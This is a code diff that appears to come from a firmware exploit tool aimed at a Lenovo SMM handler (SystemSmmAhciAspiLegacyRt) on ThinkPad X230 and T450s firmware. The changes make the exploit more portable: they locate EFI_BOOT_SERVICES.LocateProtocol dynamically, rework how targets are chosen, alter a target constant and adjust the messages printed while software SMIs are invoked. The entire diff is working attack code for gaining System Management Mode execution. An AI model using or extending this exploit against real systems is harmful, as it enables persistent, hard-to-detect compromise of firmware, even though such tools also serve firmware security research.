@@ -55,6 +55,9 @@
         }
 */
 
+// LocateProtocol field offset
+#define EFI_BOOT_SERVICES_LocateProtocol 0x140
+
 /*
     List of model and firmware version specific constants for different targets.
 */
@@ -62,7 +65,7 @@ static UEFI_EXPL_TARGET g_targets[] =
 {
     { 0xd12493b0, 0x01, "Lenovo ThinkPad X230 firmware 2.61"  },
 
-    { 0xa0cd6750, 0x03, "Lenovo ThinkPad T450s firmware 1.11" }
+    { 0xa11a6750, 0x03, "Lenovo ThinkPad T450s firmware 1.11" }
 };
 
 // offsets of handler and context values in g_shellcode
@@ -168,7 +171,7 @@ bool expl_lenovo_SystemSmmAhciAspiLegacyRt(int target, PUEFI_EXPL_TARGET custom_
     smm_context.smi_count = 0;
     smm_context.user_handler = smm_context.user_context = 0;
 
-    if (custom_target == NULL)
+    if (target != -1)
     {
         // use known target
         if (target < 0 || target >= sizeof(g_targets) / sizeof(UEFI_EXPL_TARGET))
@@ -182,7 +185,7 @@ bool expl_lenovo_SystemSmmAhciAspiLegacyRt(int target, PUEFI_EXPL_TARGET custom_
 
         printf("Using target \"%s\"\n", expl_target->name);
     }
-    else
+    else if (custom_target)
     {
         if (custom_target->smi_num != -1 && custom_target->smi_num > MAX_SMI_NUM)
         {
@@ -192,11 +195,30 @@ bool expl_lenovo_SystemSmmAhciAspiLegacyRt(int target, PUEFI_EXPL_TARGET custom_
 
         // use custom caller specified target
         expl_target = custom_target;
+    }
+    else
+    {
+        return false;
+    }
 
-        printf(
-            "Using custom target with EFI_BOOT_SERVICES.LocateProtocol field address 0x%llx\n", 
-            expl_target->addr
-        );
+    if (expl_target->addr == 0)
+    {
+        // find EFI_BOOT_SERVICES.LocateProtocol address dynamically
+        unsigned long long efi_boot_services = win_get_efi_boot_services();
+        if (efi_boot_services == 0)
+        {
+            printf(__FUNCTION__"() ERROR: Unable to find EFI_BOOT_SERVICES address\n");
+            return false;
+        }
+        
+        expl_target->addr = efi_boot_services + EFI_BOOT_SERVICES_LocateProtocol;
+    }
+
+    printf("EFI_BOOT_SERVICES.LocateProtocol address is 0x%llx\n", expl_target->addr);
+
+    if (expl_target->smi_num != -1)
+    {
+        printf("SMI handler number is %d\n", expl_target->smi_num);
     }
 
     if (handler)
@@ -273,7 +295,7 @@ bool expl_lenovo_SystemSmmAhciAspiLegacyRt(int target, PUEFI_EXPL_TARGET custom_
 
                     while (smi_num < MAX_SMI_NUM)
                     {
-                        printf("Generating SMI %d...\n", smi_num);
+                        printf("Generating software SMI %d...\n", smi_num);
 
                         if (uefi_expl_smi_invoke(smi_num))
                         {
